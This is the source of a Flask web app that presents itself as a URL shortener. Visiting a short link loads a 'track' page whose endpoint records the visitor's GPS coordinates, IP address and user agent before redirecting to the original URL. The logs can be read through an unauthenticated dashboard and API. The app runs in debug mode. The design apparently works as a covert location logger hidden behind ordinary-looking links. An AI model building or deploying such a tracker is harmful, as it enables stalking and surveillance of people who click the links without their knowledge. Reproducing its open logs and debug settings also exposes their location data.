from flask import Flask, request, jsonify, render_template, redirect
import sqlite3
import uuid
import logging

app = Flask(__name__)
app.config['DEBUG'] = True

logging.basicConfig(level=logging.INFO)

DB_NAME = 'database.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS links (
            id TEXT PRIMARY KEY,
            original_url TEXT NOT NULL,
            short_code TEXT UNIQUE NOT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_code TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
            ip TEXT,
            user_agent TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# ====================== ROUTES ======================

@app.route('/')
def home():
    return render_template('index.html')

# Create short link with better uniqueness
@app.route('/api/shorten', methods=['POST'])
def shorten():
    data = request.get_json()
    original_url = data.get('original_url')
    
    if not original_url:
        return jsonify({'error': 'URL is required'}), 400

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    # Try up to 5 times to generate unique short code
    for _ in range(5):
        short_code = str(uuid.uuid4())[:8].lower()
        
        try:
            c.execute('INSERT INTO links (id, original_url, short_code) VALUES (?, ?, ?)',
                      (str(uuid.uuid4()), original_url, short_code))
            conn.commit()
            
            short_url = f"{request.host_url.rstrip('/')}/{short_code}"
            app.logger.info(f"Created short link: {short_code} -> {original_url}")
            
            conn.close()
            return jsonify({'short_url': short_url, 'short_code': short_code})
            
        except sqlite3.IntegrityError:
            continue  # Try again with new short_code
    
    conn.close()
    return jsonify({'error': 'Failed to create unique short code'}), 500

# Handle short link
@app.route('/<short_code>')
def track(short_code):
    short_code = short_code.strip().lower()
    return render_template('track.html', short_code=short_code)

# Receive GPS data
@app.route('/api/track/<short_code>', methods=['POST'])
def log_location(short_code):
    short_code = short_code.strip().lower()
    data = request.get_json() or {}
    
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    # Check if link exists
    c.execute('SELECT original_url FROM links WHERE short_code = ?', (short_code,))
    if not c.fetchone():
        conn.close()
        app.logger.error(f"Link not found: {short_code}")
        return jsonify({'error': 'Link not found'}), 404
    
    c.execute('''
        INSERT INTO logs (short_code, latitude, longitude, accuracy, ip, user_agent)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (short_code, latitude, longitude, accuracy, ip, user_agent))
    
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'logged'})

# Final redirect
@app.route('/redirect/<short_code>')
def final_redirect(short_code):
    short_code = short_code.strip().lower()
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('SELECT original_url FROM links WHERE short_code = ?', (short_code,))
    result = c.fetchone()
    conn.close()
    
    if result:
        return redirect(result[0])
    return f"Link not found: {short_code}", 404

# Logs Dashboard
@app.route('/logs/<short_code>')
def logs_page(short_code):
    return render_template('logs.html', short_code=short_code.lower())

@app.route('/api/logs/<short_code>')
def get_logs(short_code):
    short_code = short_code.strip().lower()
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        SELECT latitude, longitude, accuracy, timestamp, ip, user_agent 
        FROM logs 
        WHERE short_code = ? 
        ORDER BY timestamp DESC
    ''', (short_code,))
    logs = c.fetchall()
    conn.close()
    
    return jsonify([{
        'lat': row[0],
        'lng': row[1],
        'accuracy': row[2],
        'time': row[3],
        'ip': row[4],
        'user_agent': row[5]
    } for row in logs])

if __name__ == '__main__':
    app.run(debug=True, port=5000)
